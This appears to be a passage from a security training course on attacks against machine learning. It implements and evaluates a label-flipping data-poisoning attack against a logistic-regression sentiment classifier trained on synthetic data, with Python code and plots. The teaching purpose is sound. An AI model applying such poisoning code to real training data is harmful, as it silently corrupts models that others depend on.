<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false" form="prefix">(</mo><mi>𝐰</mi><mo>,</mo><mi>b</mi><mo stretchy="false" form="postfix">)</mo><mo>=</mo><mi>−</mi><mfrac><mn>1</mn><mi>N</mi></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>N</mi></munderover><mrow><mo stretchy="true" form="prefix">[</mo><msub><mi>y</mi><mi>i</mi></msub><mi>log</mi><mo stretchy="false" form="prefix">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mo>+</mo><mo stretchy="false" form="prefix">(</mo><mn>1</mn><mo>−</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mi>log</mi><mo stretchy="false" form="prefix">(</mo><mn>1</mn><mo>−</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mo stretchy="true" form="postfix">]</mo></mrow></mrow><annotation encoding="application/x-tex">L(\mathbf{w}, b) = -\frac{1}{N} \sum_{i=1}^{N} \left[ y_i \log(p_i) + (1 - y_i) \log(1 - p_i) \right]</annotation></semantics></math></p></p>
<p><p>Here,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>N</mi><annotation encoding="application/x-tex">N</annotation></semantics></math>
is the number of training reviews,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>y</mi><mi>i</mi></msub><annotation encoding="application/x-tex">y_i</annotation></semantics></math>
is the true sentiment label (0 or 1) for the
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>i</mi><annotation encoding="application/x-tex">i</annotation></semantics></math>-th
review, and
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>p</mi><mi>i</mi></msub><annotation encoding="application/x-tex">p_i</annotation></semantics></math>
is the model’s predicted probability of positive sentiment for that
review. Optimization algorithms like <code>gradient descent</code>
iteratively adjust
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>𝐰</mi><annotation encoding="application/x-tex">\mathbf{w}</annotation></semantics></math>
and
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>b</mi><annotation encoding="application/x-tex">b</annotation></semantics></math>
to minimize this loss
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>L</mi><annotation encoding="application/x-tex">L</annotation></semantics></math>.</p></p>
<p><p>Once trained, the model uses the learned
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>𝐰</mi><annotation encoding="application/x-tex">\mathbf{w}</annotation></semantics></math>
and
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>b</mi><annotation encoding="application/x-tex">b</annotation></semantics></math>
to predict the sentiment of new, unseen reviews. For a new review
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>𝐱</mi><annotation encoding="application/x-tex">\mathbf{x}</annotation></semantics></math>,
it calculates the probability
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mi>σ</mi><mo stretchy="false" form="prefix">(</mo><msup><mi>𝐰</mi><mi>T</mi></msup><mi>𝐱</mi><mo>+</mo><mi>b</mi><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">p = \sigma(\mathbf{w}^T \mathbf{x} + b)</annotation></semantics></math>.
Typically, if
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>≥</mo><mn>0.5</mn></mrow><annotation encoding="application/x-tex">p \ge 0.5</annotation></semantics></math>,
the review is classified as <code>positive</code> (Class 1); otherwise,
it’s classified as <code>negative</code> (Class 0).</p></p>
<p><p>The <code>decision boundary</code> is the line (in our 2D feature
space) where the model is exactly uncertain
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mn>0.5</mn></mrow><annotation encoding="application/x-tex">p = 0.5</annotation></semantics></math>),
which occurs when
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi><mo>=</mo><msup><mi>𝐰</mi><mi>T</mi></msup><mi>𝐱</mi><mo>+</mo><mi>b</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">z = \mathbf{w}^T \mathbf{x} + b = 0</annotation></semantics></math>.
This linear boundary separates the feature space into regions predicted
as <code>negative</code> and <code>positive</code> sentiment. The
training process finds the line that best separates the clusters in the
training data.</p></p>


We now train this baseline model on our clean data and evaluate its accuracy on the unseen test set.

```python
# Initialize and train the Logistic Regression model
baseline_model = LogisticRegression(random_state=SEED)
baseline_model.fit(X_train, y_train)

# Predict on the test set
y_pred_baseline = baseline_model.predict(X_test)

# Calculate baseline accuracy
baseline_accuracy = accuracy_score(y_test, y_pred_baseline)
print(f"Baseline Model Accuracy: {baseline_accuracy:.4f}")


# Prepare to plot the decision boundary
def plot_decision_boundary(model, X, y, title="Decision Boundary"):
    """
    Plots the decision boundary of a trained classifier on a 2D dataset.

    Parameters:
    - model: The trained classifier object (must have a .predict method).
    - X (np.ndarray): Feature data (n_samples, 2).
    - y (np.ndarray): Labels (n_samples,).
    - title (str): The title for the plot.
    """
    h = 0.02  # Step size in the mesh
    x_min, x_max = X[:, 0].min() - 1, X[:, 0].max() + 1
    y_min, y_max = X[:, 1].min() - 1, X[:, 1].max() + 1
    xx, yy = np.meshgrid(np.arange(x_min, x_max, h), np.arange(y_min, y_max, h))

    # Predict the class for each point in the mesh
    Z = model.predict(np.c_[xx.ravel(), yy.ravel()])
    Z = Z.reshape(xx.shape)

    plt.figure(figsize=(12, 6))
    # Plot the decision boundary contour
    plt.contourf(
        xx, yy, Z, cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]), alpha=0.3
    )

    # Plot the data points
    scatter = plt.scatter(
        X[:, 0],
        X[:, 1],
        c=y,
        cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
        edgecolors=node_black,
        s=50,
        alpha=0.8,
    )

    plt.title(title, fontsize=16, color=htb_green)
    plt.xlabel("Feature 1", fontsize=12)
    plt.ylabel("Feature 2", fontsize=12)

    # Create a legend manually
    handles = [
        plt.Line2D(
            [0],
            [0],
            marker="o",
            color="w",
            label="Negative Sentiment (Class 0)",
            markersize=10,
            markerfacecolor=azure,
        ),
        plt.Line2D(
            [0],
            [0],
            marker="o",
            color="w",
            label="Positive Sentiment (Class 1)",
            markersize=10,
            markerfacecolor=nugget_yellow,
        ),
    ]
    plt.legend(handles=handles, title="Classes")
    plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
    plt.xlim(xx.min(), xx.max())
    plt.ylim(yy.min(), yy.max())
    plt.show()


# Plot the decision boundary for the baseline model
plot_decision_boundary(
    baseline_model,
    X_train,
    y_train,
    title=f"Baseline Model Decision Boundary\nAccuracy: {baseline_accuracy:.4f}",
)
```

The resulting plot shows the linear decision boundary learned by the baseline model, effectively separating the simulated `Negative` and `Positive` sentiment clusters in the training data. The high accuracy score indicates it generalizes well to the unseen test data.

![Scatter plot titled 'Baseline Model Decision Boundary' with accuracy 0.9933, showing Negative Sentiment (Class 0, blue) and Positive Sentiment (Class 1, orange) across Feature 1 and Feature 2.](/storage/modules/302/label_flipping_baseline.png)

---

<!-- section 3521 | page 6 | group: Label Attacks | type: interactive -->

# The Label Flipping Attack

---

With an established baseline, we can now execute the actual attack, and to do this, we will create a function that will take the original training labels (`y_train`, representing the true sentiments) and a `poisoning percentage` as input. It will randomly select the specified fraction of training data points (reviews) and flip their labels - changing `Negative` (0) to `Positive` (1) and `Positive` (1) to `Negative` (0).<p><p>The implication of this is significant. As we have established, the
model learns its parameters
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false" form="prefix">(</mo><mi>𝐰</mi><mo>,</mo><mi>b</mi><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">(\mathbf{w}, b)</annotation></semantics></math>
by minimizing the average <code>log-loss</code>,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>L</mi><annotation encoding="application/x-tex">L</annotation></semantics></math>,
across the training dataset, the whole point of training is to find the
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>𝐰</mi><annotation encoding="application/x-tex">\mathbf{w}</annotation></semantics></math>
and
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>b</mi><annotation encoding="application/x-tex">b</annotation></semantics></math>
that make this loss
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>L</mi><annotation encoding="application/x-tex">L</annotation></semantics></math>
as small as possible, meaning the predicted probabilities
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>p</mi><mi>i</mi></msub><annotation encoding="application/x-tex">p_i</annotation></semantics></math>
align well with the true labels
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>y</mi><mi>i</mi></msub><annotation encoding="application/x-tex">y_i</annotation></semantics></math>.</p></p>
<p><p>When we flip a label for a specific instance from its true value
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>y</mi><mi>i</mi></msub><annotation encoding="application/x-tex">y_i</annotation></semantics></math>
to an incorrect value
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>y</mi><msup><mi>i</mi><mo>′</mo></msup></msub><annotation encoding="application/x-tex">y_i&#39;</annotation></semantics></math>,
we directly corrupt the contribution of that instance to the overall
loss calculation. For example, consider an instance
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}_i</annotation></semantics></math>
that truly belongs to class 0 (so
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">y_i=0</annotation></semantics></math>)
but its label is flipped to
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><msup><mi>i</mi><mo>′</mo></msup></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">y_i&#39;=1</annotation></semantics></math>.
The term for this instance inside the sum changes from
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>−</mi><mo stretchy="false" form="prefix">[</mo><mn>0</mn><mo>⋅</mo><mi>log</mi><mo>&#8289;</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mo>+</mo><mo stretchy="false" form="prefix">(</mo><mn>1</mn><mo>−</mo><mn>0</mn><mo stretchy="false" form="postfix">)</mo><mi>log</mi><mo>&#8289;</mo><mo stretchy="false" form="prefix">(</mo><mn>1</mn><mo>−</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mo stretchy="false" form="postfix">]</mo><mo>=</mo><mi>−</mi><mi>log</mi><mo>&#8289;</mo><mo stretchy="false" form="prefix">(</mo><mn>1</mn><mo>−</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">-[0 \cdot \log(p_i) + (1 - 0) \log(1 - p_i)] = -\log(1 - p_i)</annotation></semantics></math>
to
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>−</mi><mo stretchy="false" form="prefix">[</mo><mn>1</mn><mo>⋅</mo><mi>log</mi><mo>&#8289;</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mo>+</mo><mo stretchy="false" form="prefix">(</mo><mn>1</mn><mo>−</mo><mn>1</mn><mo stretchy="false" form="postfix">)</mo><mi>log</mi><mo>&#8289;</mo><mo stretchy="false" form="prefix">(</mo><mn>1</mn><mo>−</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mo stretchy="false" form="postfix">]</mo><mo>=</mo><mi>−</mi><mi>log</mi><mo>&#8289;</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">-[1 \cdot \log(p_i) + (1 - 1) \log(1 - p_i)] = -\log(p_i)</annotation></semantics></math>.</p></p>
<p><p>If the model, based on the features
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}_i</annotation></semantics></math>,
correctly learns to predict a low probability
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>p</mi><mi>i</mi></msub><annotation encoding="application/x-tex">p_i</annotation></semantics></math>
for class 1 (since the instance truly belongs to class 0), the original
term
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>−</mi><mi>log</mi><mo>&#8289;</mo><mo stretchy="false" form="prefix">(</mo><mn>1</mn><mo>−</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">-\log(1-p_i)</annotation></semantics></math>
would be small, but the corrupted term
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>−</mi><mi>log</mi><mo>&#8289;</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">-\log(p_i)</annotation></semantics></math>
becomes very large as
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub><mo>→</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">p_i \rightarrow 0</annotation></semantics></math>.</p></p>
<p><p>This large error signal for the flipped instance strongly influences
the optimization process. It forces the algorithm to adjust the
parameters
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>𝐰</mi><annotation encoding="application/x-tex">\mathbf{w}</annotation></semantics></math>
and
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>b</mi><annotation encoding="application/x-tex">b</annotation></semantics></math>
not only fit the correctly labeled data, but also to try and accommodate
these poisoned points, and in doing so, it pushes the learned
<code>decision boundary</code> defined by
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>𝐰</mi><mi>T</mi></msup><mi>𝐱</mi><mo>+</mo><mi>b</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\mathbf{w}^T \mathbf{x} + b = 0</annotation></semantics></math>,
<code>away from the optimal position</code> determined by the true
underlying data distribution.</p></p>


## flip_labels

To execute this attack, we will implement a function to contain all logic: `flip_labels`. This function takes the original training labels (`y_train`) and a `poison_percentage` as input, specifying the fraction of labels to flip.

First, we define the function signature and ensure the provided `poison_percentage` is a valid value between 0 and 1. This prevents nonsensical inputs. We also calculate the absolute number of labels to flip (`n_to_flip`) based on the total number of samples and the specified percentage.

```python
def flip_labels(y, poison_percentage):
    if not 0 <= poison_percentage <= 1:
        raise ValueError("poison_percentage must be between 0 and 1.")

    n_samples = len(y)
    n_to_flip = int(n_samples * poison_percentage)

    if n_to_flip == 0:
        print("Warning: Poison percentage is 0 or too low to flip any labels.")
        # Return unchanged labels and empty indices if no flips are needed
        return y.copy(), np.array([], dtype=int)
```

Next, we select which specific reviews (data points) will have their sentiment labels flipped. We use a NumPy random number generator (`rng_instance`) seeded with our global `SEED` (or the function's seed parameter) for reproducible random selection. The `choice` method selects `n_to_flip` unique indices from the range `0` to `n_samples - 1` without replacement. These `flipped_indices` identify the exact reviews targeted by the attack.

```python
    # Use the defined SEED for the random number generator
    rng_instance = np.random.default_rng(SEED)
    # Select unique indices to flip
    flipped_indices = rng_instance.choice(n_samples, size=n_to_flip, replace=False)
```

Now, we perform the actual label flipping. We create a copy of the original label array (`y_poisoned = y.copy()`) to avoid altering the original data. For the elements at the `flipped_indices`, we invert their labels: `0` becomes `1`, and `1` becomes `0`. A concise way to do this is `1 - label` for binary 0/1 labels, or using `np.where` for clarity.

```python
    # Create a copy to avoid modifying the original array
    y_poisoned = y.copy()

    # Get the original labels at the indices we are about to flip
    original_labels_at_flipped = y_poisoned[flipped_indices]

    # Apply the flip: if original was 0, set to 1; otherwise (if 1), set to 0
    y_poisoned[flipped_indices] = np.where(original_labels_at_flipped == 0, 1, 0)

    print(f"Flipping {n_to_flip} labels ({poison_percentage * 100:.1f}%).")
```

Lastly, the function returns the `y_poisoned` array containing the corrupted labels and the `flipped_indices` array, allowing us to track which reviews were affected.

```python
    return y_poisoned, flipped_indices
```

We also need a function to plot the data so its easy to see the effects of the attack.

```python
def plot_poisoned_data(
    X,
    y_original,
    y_poisoned,
    flipped_indices,
    title="Poisoned Data Visualization",
    target_class_info=None,
):
    """
    Plots a 2D dataset, highlighting points whose labels were flipped.

    Parameters:
    - X (np.ndarray): Feature data (n_samples, 2).
    - y_original (np.ndarray): The original labels before flipping (used for context if needed, currently unused in logic but good practice).
    - y_poisoned (np.ndarray): Labels after flipping.
    - flipped_indices (np.ndarray): Indices of the samples that were flipped.
    - title (str): The title for the plot.
    - target_class_info (int, optional): The class label of the points that were targeted for flipping. Defaults to None.
    """
    plt.figure(figsize=(12, 7))

    # Identify non-flipped points
    mask_not_flipped = np.ones(len(y_poisoned), dtype=bool)
    mask_not_flipped[flipped_indices] = False

    # Plot non-flipped points (color by their poisoned label, which is same as original)
    plt.scatter(
        X[mask_not_flipped, 0],
        X[mask_not_flipped, 1],
        c=y_poisoned[mask_not_flipped],
        cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
        edgecolors=node_black,
        s=50,
        alpha=0.6,
        label="Unchanged Label",  # Keep this generic
    )

    # Determine the label for flipped points in the legend
    if target_class_info is not None:
        flipped_legend_label = f"Flipped (Orig Class {target_class_info})"
        # You could potentially use target_class_info to adjust facecolor if needed,
        # but current logic colors by the new label which is often clearer.
    else:
        flipped_legend_label = "Flipped Label"

    # Plot flipped points with a distinct marker and outline
    if len(flipped_indices) > 0:
        # Color flipped points according to their new (poisoned) label
        plt.scatter(
            X[flipped_indices, 0],
            X[flipped_indices, 1],
            c=y_poisoned[flipped_indices],  # Color by the new label
            cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
            edgecolors=malware_red,  # Highlight edge in red
            linewidths=1.5,
            marker="X",  # Use 'X' marker
            s=100,
            alpha=0.9,
            label=flipped_legend_label,  # Use the determined label
        )

    plt.title(title, fontsize=16, color=htb_green)
    plt.xlabel("Feature 1", fontsize=12)
    plt.ylabel("Feature 2", fontsize=12)

    # Create legend
    handles = [
        plt.Line2D(
            [0],
            [0],
            marker="o",
            color="w",
            label="Class 0 Point (Azure)",
            markersize=10,
            markerfacecolor=azure,
            linestyle="None",
        ),
        plt.Line2D(
            [0],
            [0],
            marker="o",
            color="w",
            label="Class 1 Point (Yellow)",
            markersize=10,
            markerfacecolor=nugget_yellow,
            linestyle="None",
        ),
        # Add the flipped legend entry using the label
        plt.Line2D(
            [0],
            [0],
            marker="X",
            color="w",
            label=flipped_legend_label,
            markersize=12,
            markeredgecolor=malware_red,
            markerfacecolor=hacker_grey,
            linestyle="None",
        ),
    ]
    plt.legend(handles=handles, title="Data Points")
    plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
    plt.show()
```

---

<!-- section 3522 | page 7 | group: Label Attacks | type: interactive -->

# Evaluating the Label Flipping Attack

---

Let's begin by poisoning a small fraction, say 10%, of the training labels and observe the impact on our sentiment analysis model.

The process involves several steps:
1. Use the `flip_labels` function on the original `y_train` data to create a poisoned version (`y_train_poisoned_10`) where 10% of the sentiment labels are flipped.
2. Visualize the resulting corrupted training set using `plot_poisoned_data` to see which points were flipped.
3. Train a new `Logistic Regression` model (`model_10_percent`) using the original features `X_train` but the poisoned labels `y_train_poisoned_10`.
4. Evaluate this poisoned model's accuracy on the original, clean test set (`X_test`, `y_test`). This is crucial - we want to see how the poisoning affects performance on legitimate, unseen data.
5. Visualize the decision boundary learned by the `model_10_percent` using `plot_decision_boundary`.

```python
results = {
    "percentage": [],
    "accuracy": [],
    "model": [],
    "y_train_poisoned": [],
    "flipped_indices": [],
}
decision_boundaries_data = []  # To store data for the combined plot

# Add baseline results first
results["percentage"].append(0.0)
results["accuracy"].append(baseline_accuracy)
results["model"].append(baseline_model)
results["y_train_poisoned"].append(y_train.copy())
results["flipped_indices"].append(np.array([], dtype=int))

# Calculate meshgrid once for all boundary plots
h = 0.02  # Step size in the mesh
x_min, x_max = X_train[:, 0].min() - 1, X_train[:, 0].max() + 1
y_min, y_max = X_train[:, 1].min() - 1, X_train[:, 1].max() + 1
xx, yy = np.meshgrid(np.arange(x_min, x_max, h), np.arange(y_min, y_max, h))
mesh_points = np.c_[xx.ravel(), yy.ravel()]

# Perform 10% Poisoning
poison_percentage_10 = 0.10
print(f"\n--- Testing with {poison_percentage_10 * 100:.0f}% Poisoned Data ---")

# Create 10% Poisoned Data
y_train_poisoned_10, flipped_indices_10 = flip_labels(y_train, poison_percentage_10)

# Visualize 10% Poisoned Data
plot_poisoned_data(
    X_train,
    y_train,
    y_train_poisoned_10,
    flipped_indices_10,
    title=f"Training Data with {poison_percentage_10 * 100:.0f}% Flipped Labels",
)

# Train Model on 10% Poisoned Data
model_10_percent = LogisticRegression(random_state=SEED)
model_10_percent.fit(X_train, y_train_poisoned_10)  # Train with original X, poisoned y

# Evaluate on Clean Test Data
y_pred_10_percent = model_10_percent.predict(X_test)
accuracy_10_percent = accuracy_score(y_test, y_pred_10_percent)
print(f"Accuracy on clean test set (10% poisoned): {accuracy_10_percent:.4f}")

# Store Results
results["percentage"].append(poison_percentage_10)
results["accuracy"].append(accuracy_10_percent)
results["model"].append(model_10_percent)
results["y_train_poisoned"].append(y_train_poisoned_10)
results["flipped_indices"].append(flipped_indices_10)

# Visualize Decision Boundary
plot_decision_boundary(
    model_10_percent,
    X_train,
    y_train_poisoned_10,  # Visualize boundary with poisoned labels shown
    title=f"Decision Boundary ({poison_percentage_10 * 100:.0f}% Poisoned)\nAccuracy: {accuracy_10_percent:.4f}",
)

# Store decision boundary prediction for combined plot
Z_10 = model_10_percent.predict(mesh_points)
Z_10 = Z_10.reshape(xx.shape)
decision_boundaries_data.append({"percentage": poison_percentage_10, "Z": Z_10})
print(
    f"Baseline accuracy was: {baseline_accuracy:.4f}"
)  # Print baseline for comparison

```

In this specific case, with our clearly separated synthetic data, poisoning only 10% of the labels results in no accuracy loss, both are 99.33% accurate. While the accuracy has not changed, the decision boundary will still have shifted slightly as the model compensates for the poisoned data.

![Scatter plot titled 'Decision Boundary (10% Poisoned)' with accuracy 0.9933, showing Class 0 (blue) and Class 1 (orange) across Feature 1 and Feature 2.](/storage/modules/302/label_flipping_10p_poisoned_boundary.png)

To get a clearer view of the shift, let's overlay the original `baseline boundary` (trained on clean data) and the `10% poisoned boundary` on the same plot.

```python
plt.figure(figsize=(12, 8))

# Plot the 10% poisoned data points for context
mask_not_flipped_10 = np.ones(len(y_train), dtype=bool)
mask_not_flipped_10[flipped_indices_10] = False
plt.scatter(
    X_train[mask_not_flipped_10, 0],
    X_train[mask_not_flipped_10, 1],
    c=y_train_poisoned_10[mask_not_flipped_10],
    cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
    edgecolors=node_black,
    s=50,
    alpha=0.6,
    label="Original Label (in 10% set)",
)

# Plot flipped points ('X' marker)
if len(flipped_indices_10) > 0:
    plt.scatter(
        X_train[flipped_indices_10, 0],
        X_train[flipped_indices_10, 1],
        c=y_train_poisoned_10[flipped_indices_10],  # Color by the new poisoned label
        cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
        edgecolors=malware_red,
        linewidths=1.5,
        marker="X",
        s=100,
        alpha=0.9,
        label="Flipped Label (10% set)",
    )

# Overlay Baseline Decision Boundary (Solid Green)
baseline_model_retrieved = results["model"][
    results["percentage"].index(0.0)
]  # Get baseline model
if baseline_model_retrieved:
    Z_baseline = baseline_model_retrieved.predict(mesh_points).reshape(xx.shape)
    plt.contour(
        xx,
        yy,
        Z_baseline,
        levels=[0.5],
        colors=[htb_green],
        linestyles=["solid"],
        linewidths=[2.5],
    )
else:
    print("Warning: Baseline model not found for comparison plot.")


# Overlay 10% Poisoned Decision Boundary
plt.contour(
    xx,
    yy,
    Z_10,
    levels=[0.5],
    colors=[aquamarine],
    linestyles=["dashed"],
    linewidths=[2.5],
)


plt.title(
    "Comparison: Baseline vs. 10% Poisoned Decision Boundary",
    fontsize=16,
    color=htb_green,
)
plt.xlabel("Feature 1", fontsize=12)
plt.ylabel("Feature 2", fontsize=12)

# Create legend
handles = [
    plt.Line2D(
        [0],
        [0],
        color=htb_green,
        lw=2.5,
        linestyle="solid",
        label="Baseline Boundary (0%)",
    ),
    plt.Line2D(
        [0],
        [0],
        color=aquamarine,
        lw=2.5,
        linestyle="dashed",
        label="Poisoned Boundary (10%)",
    ),
    plt.Line2D(
        [0],
        [0],
        marker="o",
        color="w",
        label="Class 0 Point",
        markersize=10,
        markerfacecolor=azure,
        linestyle="None",
    ),
    plt.Line2D(
        [0],
        [0],
        marker="o",
        color="w",
        label="Class 1 Point",
        markersize=10,
        markerfacecolor=nugget_yellow,
        linestyle="None",
    ),
    plt.Line2D(
        [0],
        [0],
        marker="X",
        color="w",
        label="Flipped Point",
        markersize=10,
        markeredgecolor=malware_red,
        markerfacecolor=hacker_grey,
        linestyle="None",
    ),
]
plt.legend(handles=handles, title="Boundaries & Data Points")
plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
plt.xlim(xx.min(), xx.max())
plt.ylim(yy.min(), yy.max())
plt.show()
```

We can clearly see how the decision boundary has started to shift in this plot:

![Scatter plot titled 'Comparison: Baseline vs. 10% Poisoned Decision Boundary' showing Baseline Boundary (solid line), Poisoned Boundary (dashed line), Class 0 (blue), Class 1 (orange), and Flipped Points (red X) across Feature 1 and Feature 2.](/storage/modules/302/label_flipping_10p_overlaid_boundary.png)

Now, let's systematically increase the `poisoning percentage` from 20% up to 50% and observe the effects. We will repeat the process for each level: flip labels, train a new model, evaluate its accuracy on the clean test set, and visualize the resulting decision boundary. 

```python
poison_percentages_high = [0.20, 0.30, 0.40, 0.50]

for pp in poison_percentages_high:
    print(f"\n--- Training with {pp * 100:.0f}% Poisoned Data ---")

    # Create Poisoned Data
    y_train_poisoned, flipped_idx = flip_labels(y_train, pp)

    # Train Model on Poisoned Data
    poisoned_model = LogisticRegression(random_state=SEED)
    try:
        poisoned_model.fit(
            X_train, y_train_poisoned
        )  # Train with original X, but poisoned y
    except Exception as e:
        print(f"Error training model at {pp * 100}% poisoning: {e}")
        results["percentage"].append(pp)
        results["accuracy"].append(np.nan)  # Indicate failure
        results["model"].append(None)
        results["y_train_poisoned"].append(
            y_train_poisoned
        )  # Still store poisoned labels
        results["flipped_indices"].append(flipped_idx)  # and indices
        continue  # Skip to next percentage

    # Evaluate on Clean Test Data
    y_pred_poisoned = poisoned_model.predict(X_test)
    accuracy = accuracy_score(
        y_test, y_pred_poisoned
    )  # Always evaluate against TRUE test labels
    print(f"Accuracy on clean test set: {accuracy:.4f}")

    # Store Results
    results["percentage"].append(pp)
    results["accuracy"].append(accuracy)
    results["model"].append(poisoned_model)
    results["y_train_poisoned"].append(y_train_poisoned)
    results["flipped_indices"].append(flipped_idx)

    # Visualize Poisoned Data and Decision Boundary
    plot_poisoned_data(
        X_train,
        y_train,
        y_train_poisoned,
        flipped_idx,
        title=f"Training Data with {pp * 100:.0f}% Flipped Labels",
    )

    plot_decision_boundary(
        poisoned_model,
        X_train,
        y_train_poisoned,  # Visualize boundary with poisoned labels shown
        title=f"Decision Boundary ({pp * 100:.0f}% Poisoned)\nAccuracy: {accuracy:.4f}",
    )

    # Store decision boundary prediction for combined plot
    Z = poisoned_model.predict(mesh_points)
    Z = Z.reshape(xx.shape)
    decision_boundaries_data.append({"percentage": pp, "Z": Z})

print("\n--- Evaluation Complete for Higher Percentages ---")
```

Looking at the outputs we can see how the boundaries are shifting for each  percentage shift.

![Scatter plot titled 'Decision Boundary (20% Poisoned)' with accuracy 0.9933, showing Class 0 (blue) and Class 1 (orange) across Feature 1 and Feature 2.](/storage/modules/302/label_flipping_20p_boundary.png)

Let's consolidate the findings. We'll first plot the trend of the model's accuracy (evaluated on the clean test set) against the percentage of labels flipped during training (from 0% up to 50%).

```python
# Plot accuracy vs. poisoning percentage
plt.figure(figsize=(8, 5))
# Ensure percentages and accuracies are sorted correctly if the order changed for any reason
plot_data = sorted(zip(results["percentage"], results["accuracy"]))
plot_percentages = [p * 100 for p, a in plot_data]
plot_accuracies = [a for p, a in plot_data]

plt.plot(
    plot_percentages,
    plot_accuracies,
    marker="o",
    linestyle="-",
    color=htb_green,
    markersize=8,
)
plt.title("Model Accuracy vs. Label Flipping Percentage", fontsize=16, color=htb_green)
plt.xlabel("Percentage of Training Labels Flipped (%)", fontsize=12)
plt.ylabel("Accuracy on Clean Test Set", fontsize=12)
plt.xticks(plot_percentages)  # Ensure ticks match the evaluated percentages
plt.ylim(0, 1.05)
plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
plt.show()
```

